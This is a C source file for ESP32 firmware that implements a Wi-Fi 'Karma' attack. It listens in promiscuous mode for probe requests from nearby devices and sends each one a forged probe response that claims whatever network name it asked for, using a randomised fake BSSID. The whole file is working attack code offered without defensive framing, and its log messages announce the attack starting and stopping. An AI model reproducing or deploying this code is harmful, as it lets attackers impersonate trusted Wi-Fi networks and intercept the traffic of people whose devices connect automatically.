#include "wifi_engine.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "KARMA";

static volatile bool s_running = false;

static const uint8_t PROBE_RESP_TEMPLATE[] = {
    0x50, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static void send_probe_response(const uint8_t *client_mac, const uint8_t *bssid,
                                 const char *ssid)
{
    uint8_t resp[256];
    memcpy(resp, PROBE_RESP_TEMPLATE, sizeof(PROBE_RESP_TEMPLATE));

    memcpy(&resp[4], client_mac, 6);
    memcpy(&resp[10], bssid, 6);
    memcpy(&resp[16], bssid, 6);

    size_t off = sizeof(PROBE_RESP_TEMPLATE);
    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    resp[off++] = 0x00;
    resp[off++] = ssid_len;
    memcpy(resp + off, ssid, ssid_len);
    off += ssid_len;

    uint8_t rates[] = {0x02, 0x04, 0x0B, 0x16, 0x0C, 0x12, 0x18, 0x24};
    resp[off++] = 0x01;
    resp[off++] = sizeof(rates);
    memcpy(resp + off, rates, sizeof(rates));
    off += sizeof(rates);

    resp[off++] = 0x03;
    resp[off++] = 0x01;
    resp[off++] = 0x06;

    esp_wifi_80211_tx(WIFI_IF_STA, resp, off, false);

    char mac_str[18];
    wifi_mac_to_str(client_mac, mac_str);
    ESP_LOGI(TAG, "Karma response → %s for SSID '%s'", mac_str, ssid);
}

static void karma_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running) return;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    uint16_t fc = (ipkt->frame_ctrl[1] << 8) | ipkt->frame_ctrl[0];
    uint8_t subtype = (fc >> 4) & 0x0F;

    if (subtype != 0x04) return;

    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    uint8_t *src = &frame[10];

    uint8_t *ies = frame + 24;
    uint16_t ies_len = len - 24;

    size_t off = 0;
    while (off < ies_len) {
        if (ies[off] == 0x00) {
            uint8_t ssid_len = ies[off + 1];
            if (ssid_len == 0) return;
            char ssid[33] = {0};
            memcpy(ssid, &ies[off + 2], ssid_len > 32 ? 32 : ssid_len);

            uint8_t bssid[6];
            esp_fill_random(bssid, 6);
            bssid[0] = (bssid[0] & 0xFE) | 0x02;

            send_probe_response(src, bssid, ssid);
            return;
        }
        off += 2 + ies[off + 1];
    }
}

esp_err_t wifi_karma_start(void)
{
    if (s_running) return ESP_OK;

    s_running = true;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&(wifi_promiscuous_filter_t){
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    });
    esp_wifi_set_promiscuous_rx_cb(karma_rx_cb);

    ESP_LOGI(TAG, "Karma attack started — responding to all probe requests");
    return ESP_OK;
}

esp_err_t wifi_karma_stop(void)
{
    s_running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    ESP_LOGI(TAG, "Karma attack stopped");
    return ESP_OK;
}
